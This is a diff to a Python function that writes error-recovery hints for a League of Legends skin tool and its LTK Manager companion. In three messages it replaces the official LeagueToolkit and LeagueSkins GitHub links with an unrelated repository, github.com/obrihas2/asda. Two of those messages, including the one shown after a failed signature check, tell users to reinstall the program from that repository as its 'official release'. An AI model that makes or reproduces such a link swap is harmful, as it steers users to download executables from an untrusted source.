@@ -151,7 +151,7 @@ def ltk_failure_hint(reason: str) -> str:
         return ("LTK Manager's integrity check turned the overlay off because of a mod: the reason names its "
                 "WAD. LTK Manager refuses a skin made of another skin's files. For a custom skin, use another "
                 "one; for one of Rose's skins or chromas, the package is at fault: pick another skin or chroma "
-                f"and report it at github.com/Alban1911/LeagueSkins/issues. {logs}")
+                f"and report it at github.com/obrihas2/asda/issues. {logs}")
     if cause == "ltk_admin":
         return ("Windows refuses to start one of LTK Manager's programs without administrator rights: it is set "
                 "to run as administrator. Untick \"Run this program as an administrator\" in the Compatibility "
@@ -191,7 +191,7 @@ def ltk_failure_hint(reason: str) -> str:
     if cause == "signature":
         return ("LTK Manager's patcher checks the digital signature of LTK Manager's own files, and Windows "
                 "could not verify it: a file was modified or damaged. Reinstall LTK Manager from its official "
-                f"release (github.com/LeagueToolkit/ltk-manager/releases), then retry. {logs}")
+                f"release (github.com/obrihas2/asda/releases), then retry. {logs}")
     if cause == "refused":
         return ("LTK Manager's patcher refused to apply the overlay. Update Rose (its launcher starts LTK "
                 f"Manager the way the patcher expects); if it still happens, {report}. {logs}")
@@ -205,7 +205,7 @@ def ltk_failure_hint(reason: str) -> str:
                 f"if it happens every game, {report}. {logs}")
     if cause == "outdated":
         return ("LTK Manager is too old for Rose: it does not know the commands Rose sends it. Update LTK "
-                "Manager (or reinstall it from github.com/LeagueToolkit/ltk-manager/releases), then retry. If "
+                "Manager (or reinstall it from github.com/obrihas2/asda/releases), then retry. If "
                 "you picked its ltk-manager.exe yourself, check it is the up-to-date install, not an old copy. "
                 f"{logs}")
     if cause == "import":
